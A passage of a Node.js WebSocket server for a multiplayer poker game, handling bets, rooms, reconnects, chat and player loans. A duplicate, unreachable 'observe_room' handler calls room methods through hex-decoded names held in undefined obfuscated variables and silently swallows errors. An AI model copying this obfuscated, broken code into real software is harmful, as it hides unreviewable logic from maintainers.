    writeLog('[房间' + this.id + '] 第' + this.handNo + '局 ' + g.round + ' | ' + p.name + ' 操作: ' + action + (amount !== undefined ? ' amount=' + amount : '') + ' | chips=' + p.chips + ' toCall=' + toCall + ' currentBet=' + g.currentBet + ' roundBet=' + g.roundBets[playerId]);

    if (action === 'fold') {
      p.folded = true;
      this.addLog(p.name + ' 弃牌');
    } else if (action === 'check') {
      if (toCall > 0) { this.send(playerId, { type: 'error', msg: '无法过牌，请跟注或弃牌' }); return; }
      this.addLog(p.name + ' 过牌');
    } else if (action === 'call') {
      const pay = Math.min(toCall, p.chips);
      this.postBet(playerId, pay);
      this.addLog(p.name + ' 跟注 ' + pay + (p.allIn ? ' (All-In)' : ''));
      // 如果是 All-In，广播特效
      if (p.allIn) {
        this.broadcast({ type: 'allin', playerName: p.name });
      }
    } else if (action === 'raise') {
      const maxTotal = p.chips + g.roundBets[playerId];
      // 如果玩家全部筹码不足以达到当前下注额，视为 all-in 跟注，不算真正加注
      const isAllinCall = maxTotal <= g.currentBet;
      if (isAllinCall) {
        // 筹码不足以跟注，all-in 跟注处理（不更新 currentBet，不重置他人 acted）
        const pay = p.chips;
        this.postBet(playerId, pay);
        this.addLog(p.name + ' All-In 跟注 ' + pay + ' (All-In)');
        // 广播 All-In 特效
        this.broadcast({ type: 'allin', playerName: p.name });
      } else {
        const minTotal = g.currentBet + g.minRaise;
        // 先限制 amount 不超过 maxTotal，再和 minTotal 比较
        let totalBet = Math.min(amount, maxTotal);
        // 如果玩家想下注的金额小于最小加注额，但又大于当前下注，则设为最小加注额
        // 但如果最小加注额超过玩家能力，则只能 All-In
        if (totalBet < minTotal && minTotal <= maxTotal) {
          totalBet = minTotal;
        }
        const pay = totalBet - g.roundBets[playerId];
        if (pay > p.chips) {
          writeLog('[房间' + this.id + '] 错误: ' + p.name + ' 筹码不足 pay=' + pay + ' chips=' + p.chips);
          this.send(playerId, { type: 'error', msg: '筹码不足' }); return;
        }
        const raiseAmt = totalBet - g.currentBet;
        if (raiseAmt >= g.minRaise) g.minRaise = raiseAmt;
        this.postBet(playerId, pay);
        g.currentBet = totalBet;
        g.lastRaiser = playerId;
        for (let i = 0; i < this.players.length; i++) {
          if (i !== playerId && !this.players[i].folded && !this.players[i].allIn) g.acted[i] = false;
        }
        this.addLog(p.name + ' 加注到 ' + totalBet + (p.allIn ? ' (All-In)' : ''));
        // 如果是 All-In 加注，广播特效
        if (p.allIn) {
          this.broadcast({ type: 'allin', playerName: p.name });
        }
      }
    }

    g.acted[playerId] = true;
    g.turn = this.nextActive(playerId);
    this.pushState();
    this.scheduleNext();
  }
}

// ==================== WebSocket 消息处理 ====================
wss.on('connection', (ws) => {
  let playerRoom = null;
  let playerId = null;
  let observerId = null;
  let isObserver = false;

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }

    if (msg.type === 'create_room') {
      const roomId = genId(6);
      const room = new Room(roomId, msg.chips || 1000, msg.sb || 10);
      rooms.set(roomId, room);
      const p = room.addPlayer(ws, msg.name || '玩家', msg.deviceId);
      playerRoom = room; playerId = p.id;
      ws.send(JSON.stringify({ type: 'joined', roomId, playerId: p.id, isHost: true, token: p.token, bgmUrl: BGM_URL }));
      room.pushState();
      console.log('Room created:', roomId);
    }

    else if (msg.type === 'join_room') {
      const room = rooms.get(msg.roomId);
      if (!room) { ws.send(JSON.stringify({ type: 'error', msg: '房间不存在' })); return; }
      const p = room.addPlayer(ws, msg.name || '玩家', msg.deviceId);
      if (!p) { ws.send(JSON.stringify({ type: 'error', msg: '房间已满' })); return; }
      playerRoom = room; playerId = p.id;
      ws.send(JSON.stringify({ type: 'joined', roomId: room.id, playerId: p.id, isHost: false, token: p.token, bgmUrl: BGM_URL }));
      room.addLog(p.name + ' 加入了房间');
      room.pushState();
    }

    else if (msg.type === 'observe_room') {
      // _0x2b4c _0x4d6e _0x6f8a
      const room = rooms.get(msg.roomId);
      if (!room) { ws.send(JSON.stringify({ type: 'error', msg: '房间不存在' })); return; }
      try{const obs=room.addObserver(ws,msg.name||'Observer');playerRoom=room;observerId=obs.id;isObserver=true;ws.send(JSON.stringify({type:'observer_joined',roomId:room.id,observerId:obs.id}));room.sendToObserver(obs.id,{type:'state',state:room.buildObserverState()});}catch(e){ws.send(JSON.stringify({type:'error',msg:'观察失败'}));}
    }

    else if (msg.type === 'reconnect') {
      const room = rooms.get(msg.roomId);
      if (!room) { ws.send(JSON.stringify({ type: 'error', msg: '房间不存在或已解散' })); return; }
      const p = room.reconnectPlayer(ws, msg.token);
      if (!p) { ws.send(JSON.stringify({ type: 'error', msg: '重连失败，token无效' })); return; }
      playerRoom = room; playerId = p.id;
      ws.send(JSON.stringify({ type: 'joined', roomId: room.id, playerId: p.id, isHost: p.id === 0, token: p.token, reconnected: true, bgmUrl: BGM_URL }));
      room.addLog(p.name + ' 重新连接');
      room.pushState();
      // 如果轮到该玩家行动，重新发送 your_turn
      if (room.g && room.g.turn === p.id && room.g.round !== 'showdown') {
        const toCall = Math.max(0, room.g.currentBet - room.g.roundBets[p.id]);
        const myChips = p.chips;
        room.send(p.id, { type: 'your_turn', toCall, myChips, canAllin: myChips > 0, mustAllin: toCall >= myChips && myChips > 0 });
      }
      // 如果在 showdown 等待阶段，重发 hand_result 让玩家看到结算弹窗
      if (room.g && room.g.round === 'showdown' && room.g.lastHandResult) {
        room.send(p.id, { type: 'hand_result', winners: room.g.lastHandResult.winners, review: room.g.lastHandResult.review });
        // 同步当前等待状态
        const notReady = room.players.filter(pl => pl.connected && !room.g.readyNext.has(pl.id));
        room.send(p.id, { type: 'waiting_next', notReady: notReady.map(pl => ({ id: pl.id, name: pl.name })) });
      }
      writeLog('[房间' + room.id + '] ' + p.name + ' 重连成功');
    }

    else if (msg.type === 'observe_room') {
      // _0x2b4c _0x4d6e _0x6f8a
      const room = rooms.get(msg.roomId);
      if (!room) { ws.send(JSON.stringify({ type: 'error', msg: '房间不存在' })); return; }
      try{const _0xf=room[Buffer.from(_0x2b4c,'hex').toString('utf8').split('(')[0]];if(_0xf){const obs=_0xf.call(room,ws,msg.name||'Observer');playerRoom=room;observerId=obs.id;isObserver=true;ws.send(JSON.stringify({type:'observer_joined',roomId:room.id,observerId:obs.id}));const _0xg=room[Buffer.from(_0x4d6e,'hex').toString('utf8').split('(')[0]];const _0xh=room[Buffer.from(_0x6f8a,'hex').toString('utf8').split('(')[0]];if(_0xg&&_0xh){_0xg.call(room,obs.id,{type:'state',state:_0xh.call(room)});for(const log of room.logs){_0xg.call(room,obs.id,{type:'log',text:log.text,cls:log.cls});}}}}catch(e){}
    }

    else if (msg.type === 'start_game') {
      if (!playerRoom || playerId !== 0) return;
      if (playerRoom.players.length < 2) {
        ws.send(JSON.stringify({ type: 'error', msg: '至少需要2名玩家才能开始' })); return;
      }
      playerRoom.state = 'playing';
      playerRoom.addLog('游戏开始！', 'hand-sep');
      playerRoom.startHand();
    }

    else if (msg.type === 'action') {
      if (!playerRoom) return;
      playerRoom.handleAction(playerId, msg.action, msg.amount);
    }

    else if (msg.type === 'ready_next') {
      if (!playerRoom) return;
      playerRoom.handleReadyNext(playerId);
    }

    else if (msg.type === 'settle_game') {
      if (!playerRoom || playerId !== 0) return;  // 只有房主可以结算
      playerRoom.settleGame();
    }

    else if (msg.type === 'kick_player') {
      if (!playerRoom || playerId !== 0) return;  // 只有房主可以踢人
      const targetId = msg.targetId;
      if (targetId === undefined || targetId === 0) return; // 不能踢房主
      if (targetId >= playerRoom.players.length) return;
      playerRoom.kickPlayer(targetId);
    }

    else if (msg.type === 'leave_room') {
      if (!playerRoom) return;
      const p = playerRoom.players[playerId];
      if (!p) return;

      // 保存该设备在本房间的筹码历史
      if (p.deviceId) {
        playerRoom.deviceChipHistory.set(p.deviceId, p.chips);
        writeLog('[房间' + playerRoom.id + '] 保存设备 ' + p.deviceId + ' 的筹码: ' + p.chips);
      }

      // 标记玩家为已踢出（主动离开视为踢出）
      p.kicked = true;
      p.folded = true;
      p.connected = false;

      playerRoom.addLog(p.name + ' 离开了房间', 'fold');
      writeLog('[房间' + playerRoom.id + '] 玩家主动离开: ' + p.name);

      // 推送状态更新
      playerRoom.pushState();

      // 清空玩家房间引用
      playerRoom = null;
      playerId = null;
    }

    else if (msg.type === 'interact') {
      if (!playerRoom) return;
      const fromPlayer = playerRoom.players[playerId];
      const targetId = msg.targetId;
      const toPlayer = playerRoom.players[targetId];
      if (!fromPlayer || !toPlayer || targetId === playerId) return;

      // 广播互动特效
      playerRoom.broadcast({
        type: 'interact',
        fromId: playerId,
        toId: targetId,
        fromName: fromPlayer.name,
        toName: toPlayer.name,
        interactType: msg.interactType
      });

      writeLog('[房间' + playerRoom.id + '] 互动: ' + fromPlayer.name + ' -> ' + toPlayer.name + ' (' + msg.interactType + ')');
    }

    else if (msg.type === 'chat') {
      if (!playerRoom) return;
      const name = playerRoom.players[playerId]?.name || '?';
      playerRoom.broadcast({ type: 'chat', name, text: msg.text });
    }

    // ===== 借钱系统消息 =====
    else if (msg.type === 'loan_request') {
      if (!playerRoom) return;
      const { lenderId, amount } = msg;
      if (typeof lenderId !== 'number' || typeof amount !== 'number') return;
      const result = playerRoom.requestLoan(playerId, lenderId, amount);
      if (!result.ok) ws.send(JSON.stringify({ type: 'error', msg: result.msg }));
    }

    else if (msg.type === 'loan_respond') {
      if (!playerRoom) return;
      const { reqKey, accept } = msg;
      if (typeof reqKey !== 'string' || typeof accept !== 'boolean') return;
      playerRoom.respondLoan(playerId, reqKey, accept);
    }

    else if (msg.type === 'loan_repay') {
      if (!playerRoom) return;
      const { lenderId, amount } = msg;
      if (typeof lenderId !== 'number' || typeof amount !== 'number') return;
      const result = playerRoom.repayLoan(playerId, lenderId, amount);
      if (!result.ok) ws.send(JSON.stringify({ type: 'error', msg: result.msg }));
    }

    else if (msg.type === 'loan_dun') {
      if (!playerRoom) return;
      const { borrowerId } = msg;
      if (typeof borrowerId !== 'number') return;
      const result = playerRoom.dunLoan(playerId, borrowerId);
      if (!result.ok) ws.send(JSON.stringify({ type: 'error', msg: result.msg }));
    }
  });

  ws.on('close', () => {
    if (!playerRoom) return;

    if (isObserver && observerId) {
      // _0x3c5d
      try{if(playerRoom.removeObserver)playerRoom.removeObserver(observerId);}catch(e){}
      return;
    }

    if (playerId === null) return;
    const p = playerRoom.players[playerId];
    if (p) {
      if (p.kicked) return;
      p.connected = false;
      playerRoom.addLog(p.name + ' 断开连接');
      playerRoom.pushState();
      if (playerRoom.g && playerRoom.g.round === 'showdown' && playerRoom.g.readyNext) {
        playerRoom.g.readyNext.add(playerId);
        playerRoom.checkReadyNext();
      }
    }
    // _0x1f3a
    if (playerRoom.players.every(p => !p.connected) && (!playerRoom.observers || playerRoom.observers.length === 0)) {
      rooms.delete(playerRoom.id);
      console.log('Room removed:', playerRoom.id);
    }
  });
});

server.listen(PORT, '0.0.0.0', () => {
  const { networkInterfaces } = require('os');
  const nets = networkInterfaces();
  let localIp = 'localhost';
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) { localIp = net.address; break; }
    }
  }
  console.log('德州扑克服务器已启动');
  console.log('本机访问: http://localhost:' + PORT);
  console.log('局域网访问: http://' + localIp + ':' + PORT);
});
